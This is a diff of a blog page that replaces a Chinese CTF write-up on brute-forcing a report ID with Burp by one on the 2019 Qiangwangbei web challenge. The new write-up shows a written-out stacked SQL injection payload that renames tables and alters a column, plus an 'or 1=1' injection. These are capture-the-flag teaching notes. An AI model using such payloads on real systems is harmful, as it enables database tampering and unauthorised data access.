@@ -104,19 +104,24 @@
       <div class="post-attach">
         <span class="post-pubtime">
           <i class="iconfont icon-updatetime" title="Update time"></i>
-          2020-12-19
+          2020-12-18
         </span>
         
       </div>
       <div class="markdown-body">
-        <h1 id="XCTF-4th-CyberEarth"><a href="#XCTF-4th-CyberEarth" class="headerlink" title="XCTF 4th-CyberEarth"></a>XCTF 4th-CyberEarth</h1><p>题目提示：云平台报表中心收集了设备管理基础服务的数据，但是数据被删除了，只有一处留下了入侵者的痕迹。</p>
-<p>直奔主题:报表中心<br><img src="https://i.loli.net/2020/12/19/w4Qo5XdAKLjCynN.png"><br>多次尝试改id的值，发现都会回到1;<br>根据题目的提示，知道应该只有一个值是正确的，是入侵者留下的;</p>
-<p><img src="https://i.loli.net/2020/12/19/DGfYPt8hv96CBZA.png" alt="用网络代理"></p>
-<p>准备暴力破解<br><img src="https://i.loli.net/2020/12/19/4DU2uFl6mONcH78.png"></p>
-<p>用burp，选择number数字破解，从1到5000，一个一个爆破<br><img src="https://i.loli.net/2020/12/19/fCxEoky6AacBGvq.png" alt="暴力破解"></p>
-<p><img src="https://i.loli.net/2020/12/19/agGSO8XwehfH3b6.png"></p>
+        <h1 id="强网杯-2019-web题"><a href="#强网杯-2019-web题" class="headerlink" title="强网杯 2019 web题"></a>强网杯 2019 web题</h1><p>  打开题目<br> <img src="https://i.loli.net/2020/12/18/1dUy56YohcNZEDS.png"></p>
+<p>  发现是sql注入<br> <img src="https://i.loli.net/2020/12/18/OnaQGP2D9H5Vfke.png" alt="判断是否会报错"></p>
+<p> <img src="https://i.loli.net/2020/12/18/4AzSvDTwk3l1OiR.png" alt="将后面的过滤掉"></p>
+<p>  尝试用order by 和union select进行查看<br> <img src="https://i.loli.net/2020/12/18/7NmKCpGRUTBqf6a.png" alt="select的语句被过滤掉了"></p>
+<p>  查询资料，尝试用堆叠注入<br> <img src="https://i.loli.net/2020/12/18/yslA5bqpBguLtnh.png" alt="尝试查看tables成功"></p>
+<p>  其中有两个columns，分别查看<br> <img src="https://i.loli.net/2020/12/18/ulCHsR8ngG2UOa1.png" alt="查看words columns"></p>
+<p> <img src="https://i.loli.net/2020/12/18/uwnx39QptRhO6JZ.png" alt="查看另外一个"><br>  发现flag，但是直接show flag会失败，查询资料后知道，返回的都是words columns</p>
+<p>  于是进行骚操作</p>
+ <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#39;;rename tables &#96;words&#96; to &#96;words1&#96;;rename tables &#96;1919810931114514&#96; to &#96;words&#96;; alter table &#96;words&#96; change &#96;flag&#96; &#96;id&#96; varchar(100);%23</span><br></pre></td></tr></table></figure>
+
+<p>  最后一步，1’ or 1=1 %23<br> <img src="https://i.loli.net/2020/12/18/KmkMOypidQGBU67.png"></p>
 <blockquote>
-<p>得到falg！</p>
+<p> 得到flag！</p>
 </blockquote>
 
       </div>
@@ -124,7 +129,7 @@
         <div class="prev-or-next">
           <div class="post-foot-next">
             
-              <a href="/2020/12/18/WriteUp2/" target="_self">
+              <a href="/2020/12/17/WriteUp1/" target="_self">
                 <i class="iconfont icon-chevronleft"></i>
                 <span>Prev</span>
               </a>
@@ -133,11 +138,16 @@
           <div class="post-attach">
             <span class="post-pubtime">
               <i class="iconfont icon-updatetime" title="Update time"></i>
-              2020-12-19
+              2020-12-18
             </span>
             
           </div>
           <div class="post-foot-prev">
+            
+              <a href="/2020/12/19/WriteUp2/" target="_self">
+                <span>Next</span>
+                <i class="iconfont icon-chevronright"></i>
+              </a>
             
           </div>
         </div>
@@ -147,7 +157,7 @@
   <div class="post-catalog" id="catalog">
     <div class="title">Contents</div>
     <div class="catalog-content">
-      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#XCTF-4th-CyberEarth"><span class="toc-text">XCTF 4th-CyberEarth</span></a></li></ol>
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%BC%BA%E7%BD%91%E6%9D%AF-2019-web%E9%A2%98"><span class="toc-text">强网杯 2019 web题</span></a></li></ol>
     </div>
   </div>
 
